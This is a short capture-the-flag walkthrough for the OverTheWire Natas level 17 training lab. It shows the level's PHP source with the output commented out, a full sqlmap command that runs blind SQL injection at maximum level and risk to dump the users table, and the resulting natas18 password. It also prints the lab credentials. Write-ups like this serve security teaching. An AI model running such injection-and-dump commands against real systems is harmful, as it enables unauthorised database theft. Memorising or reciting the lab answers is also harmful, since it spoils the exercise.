# Natas Level 17
The ***URL*** to which you need to connect is *http://natas17.natas.labs.overthewire.org*. The ***username*** is *natas17* and the ***password*** is *8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw*. 

Lets check the [viewsource](http://natas17.natas.labs.overthewire.org/index-source.html) link.
We See that there's some errors in the code : (comments instead of code)
```php
$res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }
```

lets try to use [SQLMap](http://sqlmap.org/) to inject some SQL. Here's a [cheat sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) to the tool. 

```
sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --data=username=natas18 --auth-type=basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw --level=5 --risk=3  --dbms=mysql -D natas17 -T users --dump
```

```
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| natas18  | xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP |
+----------+----------------------------------+
```
